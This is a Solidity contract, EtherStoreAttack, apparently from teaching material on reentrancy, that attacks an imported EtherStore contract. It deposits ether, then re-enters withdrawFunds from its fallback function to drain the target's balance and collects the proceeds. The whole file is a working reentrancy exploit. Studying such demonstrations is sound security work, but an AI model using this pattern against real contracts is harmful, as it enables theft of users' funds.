// SPDX-License-Identifier: MIT
pragma solidity 0.5.11;

import "./EtherStore.sol";

contract EtherStoreAttack {
    EtherStore public etherStore;
    EtherStore.WTYPE wtype;

    // intialize the etherStore variable with the contract address
    function setEtherStoreAddress(address _etherStoreAddress) public {
        etherStore = EtherStore(_etherStoreAddress);
    }

    function attackEtherStore(EtherStore.WTYPE _wt) public payable {
        // attack to the nearest ether
        require(msg.value >= 1 ether);
        // send eth to the depositFunds() function
        etherStore.depositFunds.value(1 ether)();
        // start the magic
        wtype = _wt;
        etherStore.withdrawFunds(_wt, 1 ether);
    }

    function collectEther() public {
        msg.sender.transfer(address(this).balance);
    }

    // fallback function - where the magic happens
    function() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdrawFunds(wtype, 1 ether);
        }
    }
}
